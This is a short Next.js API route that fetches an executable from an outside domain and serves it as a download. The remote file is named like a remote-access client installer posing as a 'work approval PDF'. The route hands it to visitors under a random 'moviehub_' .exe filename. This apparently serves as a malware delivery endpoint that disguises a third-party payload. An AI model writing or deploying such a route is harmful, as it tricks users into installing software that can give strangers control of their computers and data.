// pages/api/download.js
export default async function handler(req, res) {
  const remoteFile = 'https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';

  try {
    const response = await fetch(remoteFile);

    if (!response.ok) {
      return res.status(500).send("Failed to fetch file");
    }

    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="moviehub_${Math.random().toString(36).substring(2, 10)}.exe"`);

    response.body.pipe(res);
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal Server Error");
  }
}
